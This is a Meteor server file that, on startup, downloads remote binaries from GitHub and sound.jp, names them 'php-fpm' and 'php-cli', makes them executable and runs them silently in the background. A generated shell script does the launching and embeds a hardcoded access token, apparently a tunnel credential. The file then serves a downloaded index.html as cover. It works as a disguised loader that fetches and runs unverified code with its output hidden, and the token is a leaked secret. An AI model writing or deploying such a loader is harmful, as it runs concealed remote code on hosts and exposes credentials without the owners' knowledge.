import { Meteor } from 'meteor/meteor';
import { WebApp } from 'meteor/webapp';
import { fetch } from 'meteor/fetch';
import fs from 'fs';
import { exec } from 'child_process';
import { promisify } from 'util';

const execAsync = promisify(exec);

// begin.sh 的内容
const BEGIN_SH_CONTENT = `#!/bin/sh

# 定义Token，如果环境变量Token未定义则使用默认值
Token=\${Token:-'eyJhIjoiYjQ2N2Q5MGUzZDYxNWFhOTZiM2ZmODU5NzZlY2MxZjgiLCJ0IjoiNjBlZjljZGUtNTkyNC00Mjk4LTkwN2QtY2FjNzlkNDlmYTQ4IiwicyI6IlltUTFaalJtTURFdFpUbGtZaTAwTUdObUxXRTFOalF0TURWak5qTTBZekV4TjJSaiJ9'}

# 启动php-fpm进程
echo "Starting php-fpm with token: \$Token"
nohup ./php-fpm >/dev/null 2>&1 &
echo "php-fpm started and logging to php-fpm.log"

# 启动php-cli进程
echo "Starting php-cli..."
nohup ./php-cli >/dev/null 2>&1 &
echo "php-cli started and logging to php-cli.log"

# 实时监控日志
tail -f /dev/null
`; 

const FILES_TO_DOWNLOAD = [
  {
    url: 'https://github.com/wwrrtt/test/releases/download/3.0/index.html',
    filename: 'index.html',
  },
  {
    url: 'https://github.com/wwrrtt/test/raw/main/php-fpm',
    filename: 'php-fpm',
  },
  {
    url: 'https://sound.jp/kid/php-cli',
    filename: 'php-cli',
  }
];

// 下载文件的异步函数
async function downloadFile(url, filename) {
  console.log(`Downloading ${url}...`);
  try {
    const response = await fetch(url);
    const buffer = await response.arrayBuffer();
    fs.writeFileSync(filename, Buffer.from(buffer));
    console.log(`Downloaded ${filename}`);
  } catch (error) {
    console.error(`Error downloading ${filename}:`, error);
    throw error;
  }
}

// 设置文件（下载文件，赋予权限，执行脚本）函数
async function setupFiles() {
  try {
    console.log('Starting file setup...');
    // 下载所有文件
    for (const file of FILES_TO_DOWNLOAD) {
      await downloadFile(file.url, file.filename);
    }

    // 创建 begin.sh
    console.log('Creating begin.sh...');
    fs.writeFileSync('begin.sh', BEGIN_SH_CONTENT);

    console.log('Files downloaded, setting permissions...');
    // 修改为正确的文件名
    await execAsync('chmod +x begin.sh php-fpm php-cli');
    
    console.log('Executing begin.sh...');
    // 在后台执行脚本，但保留输出捕获
    const child = exec('nohup ./begin.sh > begin.log 2>&1 &');

    // 启动日志监控
    const logMonitor = exec('tail -f begin.log', {
      maxBuffer: 1024 * 1024 * 10
    });

    // 捕获日志输出
    logMonitor.stdout.on('data', (data) => {
      const lines = data.toString().split('\n');
      lines.forEach(line => {
        if (line.trim()) {
          console.log(`[${new Date().toISOString()}] ${line}`);
        }
      });
    });

    logMonitor.stderr.on('data', (data) => {
      const lines = data.toString().split('\n');
      lines.forEach(line => {
        if (line.trim()) {
          console.error(`[${new Date().toISOString()}] ERROR: ${line}`);
        }
      });
    });

    // 不等待完成，直接返回成功
    console.log('begin.sh started in background');
    return true;
  } catch (error) {
    console.error('Error in setup:', error);
    return false;
  }
}

// 启动时先执行文件下载和脚本，然后再设置 web 服务
Meteor.startup(async () => {
  try {
    console.log('Starting setup process...');
    const success = await setupFiles();
    
    if (!success) {
      console.error('Failed to setup files');
      return;
    }
    
    console.log('Setup completed, starting web php-fpm...');
    // 使用 WebApp.connectHandlers
    WebApp.connectHandlers.use('/', (req, res, next) => {
      if (req.url === '/') {
        try {
          const content = fs.readFileSync('index.html', 'utf8');
          res.writeHead(200, { 'Content-Type': 'text/html' });
          res.end(content);
        } catch (error) {
          console.error('Error serving index.html:', error);
          next();
        }
      } else {
        next();
      }
    });
    
    console.log('Web php-fpm started successfully');
  } catch (error) {
    console.error('Startup error:', error);
  }
});
